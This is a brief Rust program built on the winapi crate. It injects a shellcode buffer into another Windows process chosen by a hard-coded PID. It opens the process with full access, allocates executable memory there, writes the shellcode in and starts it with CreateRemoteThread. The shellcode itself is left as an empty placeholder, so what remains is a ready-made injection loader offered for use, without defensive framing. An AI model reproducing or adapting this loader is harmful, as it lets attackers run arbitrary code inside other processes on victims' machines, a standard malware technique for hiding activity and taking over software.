use std::mem::transmute;

use winapi::um::memoryapi::{VirtualAllocEx, WriteProcessMemory};
use winapi::um::processthreadsapi::{CreateRemoteThread, OpenProcess};
use winapi::um::synchapi::WaitForSingleObject;
use winapi::um::winnt::HANDLE;

use winapi::um::handleapi::{CloseHandle};

use winapi::ctypes::{c_void};
use winapi::um::winnt::{PVOID};




fn main() {
    let shellcode: [u8; 276] = [/*Your shellcode here !*/];

    let pid = 6948;   // Process who you want, to rewrite the memory


    unsafe {
        let prochandle = OpenProcess(0x001FFFFF, 0, pid);
        let basePtr = VirtualAllocEx(prochandle, std::ptr::null_mut(), shellcode.len(), 0x1000, 0x40);


        WriteProcessMemory(prochandle, basePtr, shellcode.as_ptr() as *const c_void, shellcode.len(), 0 as *mut usize);

        CreateRemoteThread(prochandle, std::ptr::null_mut(), 0, Some(transmute(basePtr)), std::ptr::null_mut(), 0, 0 as *mut u32);
        
        CloseHandle(prochandle);

    }

}
